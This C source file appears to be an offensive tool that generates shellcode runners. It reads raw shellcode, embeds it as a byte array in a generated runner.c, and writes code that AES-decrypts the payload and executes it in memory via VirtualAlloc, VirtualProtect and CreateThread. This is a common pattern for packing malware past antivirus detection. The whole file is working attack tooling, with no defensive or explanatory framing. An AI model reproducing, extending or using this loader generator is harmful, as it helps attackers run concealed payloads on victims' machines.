#include <stdio.h>
#include <Windows.h>

// Does what it says. Reads shellcode from a specified file.
BOOL ReadShellcode(IN char* sFileName, OUT PVOID *pPayload, OUT SIZE_T *sPayloadSize)
{
	// Get file size
	FILE* fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	fseek(fptr, 0, SEEK_END);
	SIZE_T sFileSize = ftell(fptr);
	fclose(fptr);

	// Read file
	fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	char* pReadIn = malloc(sFileSize);
	fgets(pReadIn, sFileSize, fptr);
	fclose(fptr);

	// Return vals
	*pPayload = pReadIn;
	*sPayloadSize = sFileSize;

	return EXIT_SUCCESS;
}

// Writes the runner. Takes in payload, encryption chain, keychain filename, and options flags.
BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN int nCycles, IN char* sKeychain, IN int nPlacement)
{
	// Runner file pointer
	FILE* fRunner = fopen("runner.c", "w");
	// Keychain file pointer
	FILE* fKeychain = fopen(sKeychain, "r");
	// Write file header, conditional payload placement
	WriteHeader(pPayload, sPayloadSize, fRunner, nPlacement);
	
	// HANDLE ENCRYPTION AND KEYS
	SIZE_T line_Size = 300;
	char* line = malloc(line_Size);
	fgets(line, line_Size, fKeychain); // Keychain header
	fgets(line, line_Size, fKeychain); // Key 1
	fprintf(fRunner, line);
	fgets(line, line_Size, fKeychain); // IV 1
	fprintf(fRunner, line);

	// WRITE DECRYPT CHAIN
	fprintf(fRunner, "\nAES_init_ctx_iv(&ctx, pKey, pIV);\n");
	fprintf(fRunner, "AES_CBC_decrypt_buffer(&ctx, pPayload, sPayloadSize);\n");

	// EXECUTION
	WriteExecution(fRunner, 1);

	fprintf(fRunner, "return EXIT_SUCCESS;\n}");

	return EXIT_SUCCESS;
}

// Write header and payload for runner
BOOL WriteHeader(PBYTE pPayload, SIZE_T sPayloadSize, FILE* fRunner, int nPlacement)
{
	switch (nPlacement)
	{
		// .text
		case 1:
			// Header
			fprintf(fRunner,"#include <Windows.h>\n"
							"#include \"aes.h\"\n"
							"int main(int argc, char* argv[]){\n"
							"struct AES_ctx ctx;\n"
							"BYTE pPayload[] = {");
			// Write payload and size
			for (int j = 0; j < sPayloadSize; j++) {
				if (j == (sPayloadSize-1))
				{
					fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
				}
				else {
					fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
				}
			}
			fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n", sPayloadSize);

			break;

		// .data
		case 2:
			fprintf(fRunner,"#include <Windows.h>\n"
							"const BYTE pPayload[] = { ");
			// Write payload and size (const)
			for (int j = 0; j < sPayloadSize; j++) {
				if (j == (sPayloadSize - 1))
				{
					fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
				}
				else {
					fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
				}
			}
			fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n", sPayloadSize);

			// Finish header
			fprintf(fRunner,"int main(int argc, char* argv[]){\n"
							"struct AES_ctx ctx;\n");
			break;
	}

	return EXIT_SUCCESS;
}

// Write execution process for runner
BOOL WriteExecution(FILE* fRunner, int nExecution)
{
	switch (nExecution)
	{
		// Local thread execution
		case 1:
		fprintf(fRunner,"PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
						"RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);\n"
						"DWORD proc = 0;\n"
						"BOOL bExecute = VirtualProtect(pWorkBuffer, sPayloadSize, PAGE_EXECUTE_READ, &proc);\n"
						"HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pWorkBuffer, 0, 0, 0);\n"
						"WaitForSingleObject(hThread, -1);\n");
			break;
	}
}